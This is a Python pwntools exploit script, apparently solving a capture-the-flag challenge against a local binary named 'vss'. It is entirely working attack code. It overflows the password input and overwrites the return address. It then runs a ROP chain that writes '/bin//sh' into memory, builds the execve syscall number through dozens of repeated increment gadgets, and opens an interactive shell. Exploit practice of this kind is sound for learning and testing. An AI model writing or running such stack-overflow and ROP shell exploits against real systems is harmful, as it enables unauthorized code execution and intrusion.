from pwn import *

p=process('./vss')

payload='py'+'A'*(0x50-0x8-0x2)+p64(0x000000000044892a)+'A'*(0xd0-0x50)

payload+=p64(0x0000000000401937) # pop2 rsi ; ret
payload+=p64(0x00000000006c4080) # @ .data
payload+=p64(0x000000000046f208) # pop2 rax ; ret
payload+='/bin//sh'
payload+=p64(0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
payload+=p64(0x0000000000401937) # pop2 rsi ; ret
payload+=p64(0x00000000006c4088) # @ .data + 8
payload+=p64(0x000000000041bd1f) # xor rax, rax ; ret
payload+=p64(0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
payload+=p64(0x0000000000401823) # pop2 rdi ; ret
payload+=p64(0x00000000006c4080) # @ .data
payload+=p64(0x0000000000401937) # pop2 rsi ; ret
payload+=p64(0x00000000006c4088) # @ .data + 8
payload+=p64(0x000000000043ae05) # pop2 rdx ; ret
payload+=p64(0x00000000006c4088) # @ .data + 8
payload+=p64(0x000000000041bd1f) # xor rax, rax ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045e790) # add rax, 1 ; ret
payload+=p64(0x000000000045f2a5) # syscall ; ret

p.recvuntil('Password:\n')
p.sendline(payload)

p.interactive()